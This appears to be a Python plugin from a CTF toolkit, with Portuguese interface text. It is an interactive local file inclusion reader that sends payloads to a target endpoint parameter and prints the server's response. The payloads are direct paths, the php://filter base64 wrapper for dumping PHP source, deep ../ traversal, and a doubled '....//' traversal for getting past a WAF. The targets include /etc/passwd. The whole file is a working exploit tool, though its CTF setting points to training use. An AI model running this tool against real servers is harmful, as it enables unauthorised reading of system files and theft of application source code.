"""
plugins/lfi.py — LFI / Local File Inclusion Reader & Source Code Dumper.
"""

from __future__ import annotations

import base64
import re
from rich.console import Console
from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.ui import ask, askctx

PLUGIN_NAME = "LFI / File Reader"
PLUGIN_DESC = "Leitor de arquivos locais (LFR) e dumper de código fonte usando PHP wrappers"

def run(session: Session, console: Console) -> None:
    console.rule("[head]LFI / LOCAL FILE READER[/head]")
    console.print("[dim]Leitor de arquivos do sistema e dump de código fonte do servidor.[/dim]\n")

    path = askctx(session, "path", "caminho do endpoint", "/index.php")
    param = askctx(session, "param", "parâmetro vulnerável", "file")
    method = ask("método (get/post)", "get").lower()

    console.print("\n[info]Selecione a Técnica de Leitura / Bypass:[/info]")
    console.print("  [1] Direta (Plain text: ex: /etc/passwd)")
    console.print("  [2] PHP Filter (Base64 Encode: ideal para ler o próprio código-fonte PHP sem rodá-lo)")
    console.print("  [3] Traversal clássico (Subindo diretórios: ../../../../etc/passwd)")
    console.print("  [4] Traversal duplicado/WAF bypass (....//....//etc/passwd)")
    tech_opt = ask("Opção", "2")

    console.print("\n[info]Digite 'exit' ou 'voltar' para encerrar o leitor de arquivos.[/info]")
    
    with H.make_client(session) as cl:
        while True:
            target_file = ask("\nArquivo a ler (ex: /etc/passwd ou index.php)", "index.php")
            if target_file.strip().lower() in ("exit", "voltar", "0", "quit"):
                break

            # Reconstrói o payload baseado na técnica escolhida
            if tech_opt == "1":
                payload = target_file
            elif tech_opt == "2":
                # php://filter/convert.base64-encode/resource=
                payload = f"php://filter/convert.base64-encode/resource={target_file}"
            elif tech_opt == "3":
                payload = f"../../../../../../../../../../../../{target_file.lstrip('/')}"
            elif tech_opt == "4":
                payload = f"....//....//....//....//....//....//....//....//{target_file.lstrip('/')}"
            else:
                payload = target_file

            console.print(f"[info]Requisitando arquivo usando payload:[/info] [yellow]{payload}[/yellow]")
            
            try:
                if method == "get":
                    r = cl.get(path, params={param: payload})
                else:
                    r = cl.post(path, json={param: payload})
                
                content = r.text
                
                # Se a técnica foi PHP Filter, tenta extrair e decodificar o base64 retornado
                if tech_opt == "2":
                    # Busca por padrões base64 longos no corpo de retorno
                    b64_match = re.search(r'(?:^|[\s>])([A-Za-z0-9+/]{40,}={0,2})(?:[\s<]|$)', content)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='replace')
                            console.print("="*60)
                            console.print("[ok]CONTEÚDO DECODIFICADO (BASE64):[/ok]")
                            console.print("="*60)
                            console.print(decoded)
                            console.print("="*60)
                            session.note(f"LFI: Arquivo lido e decodificado: {target_file}")
                            continue
                        except Exception as e:
                            console.print(f"[warn]Falha ao decodificar base64 correspondente: {e}[/warn]")
                    else:
                        console.print("[warn]Nenhuma string Base64 típica encontrada na resposta para decodificar.[/warn]")

                # Exibição padrão
                console.print("="*60)
                console.print("[ok]CONTEÚDO DO RETORNO (Raw):[/ok]")
                console.print("="*60)
                console.print(content[:1500])
                if len(content) > 1500:
                    console.print("\n... (conteúdo truncado em 1500 caracteres) ...")
                console.print("="*60)
                session.note(f"LFI: Arquivo lido (Raw): {target_file}")

            except Exception as exc:
                console.print(f"[fail]Falha na requisição LFI: {exc}[/fail]")
